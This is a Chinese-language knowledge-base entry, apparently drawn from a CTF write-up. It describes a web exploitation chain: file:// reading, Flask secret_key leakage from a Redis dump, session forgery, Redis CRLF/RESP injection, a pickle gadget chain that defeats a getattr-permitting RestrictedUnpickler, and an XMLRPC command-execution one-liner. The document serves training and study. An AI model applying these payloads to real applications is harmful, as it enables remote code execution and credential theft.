---
title: "file:// + Redis CRLF + Pickle 反序列化 RCE"
category: web
tags: [ssrf, redis, crlf, pickle, python, flask, deserialization, file-protocol]
triggers: [file://, file协议, redis, crlf注入, RESP协议, pickle, RestrictedUnpickler, getattr, CRLF injection, redis injection, avatar_url SSRF]
created: 2026-06-08
updated: 2026-06-08
sources: [raw/2026 软件系统安全赛 初赛 wp.md]
---

# file:// + Redis CRLF + Pickle 反序列化 RCE

## Summary

当 Web 应用支持 `file://` 协议读取任意文件，且后端存在 Redis + Pickle 反序列化点时，可以通过 CRLF 注入 Redis 写入恶意 Pickle payload，最终触发反序列化 RCE。

## Key Points

- `file://` 协议可以读取本地文件系统任意文件（无权限限制的）
- Redis 持久化文件 `dump.rdb` 可泄露 Flask `secret_key`
- CRLF (`\r\n`) 可将 HTTP 请求走私到 Redis，执行任意 RESP 命令
- `RestrictedUnpickler` 即使白名单放行 `getattr`，仍可通过反射链拿到 `os.system`
- XMLRPC 服务可能作为隐蔽的 RCE 通道

## 攻击链

```
1. file:///app/app.py          → 发现 Redis
2. file:///var/lib/redis/dump.rdb → 泄露 Flask secret_key
3. 伪造 admin session cookie 登录
4. /admin/online-users 触发 pickle 反序列化
5. avatar_url CRLF + RESP 注入 Redis
   → SET online_user:<user> <pickle_payload>
6. 访问触发点 → 反序列化 RCE
```

## Pickle RCE 链构造

```python
# RestrictedUnpickler 放行了 builtins.getattr
# OnlineUser 在白名单内
# 构造链：
getattr(getattr(getattr(getattr(OnlineUser, "__init__"),"__globals__")"get")("os"),"system")(cmd)
```

## Redis CRLF 注入

通过 `avatar_url` 将 HTTP 请求打到 `127.0.0.1:6379`：

```
AUTH redispass123
SET online_user:<user> <pickle_payload>
EXPIRE online_user:<user> 3600
```

## XMLRPC 隐蔽 RCE

在容器内发现了暴露的 XMLRPC 服务：

```python
# 硬编码 token: mcp_secure_token_b2rglxd
# 暴露方法: execute_command
python3 -c "import xmlrpc.client;print(xmlrpc.client.ServerProxy('http://127.0.0.1:54321/').execute_command('mcp_secure_token_b2rglxd','cat /flag'))"
```

使用 `/proc/<pid>/cmdline` 遍历子进程发现该服务。

## Connections

- Related: [[web/ssrf-gopher-techniques]], [[web/flask-ssti-session-forgery]]
- Source: [[ctf/2026-software-security-competition-qualifier]]
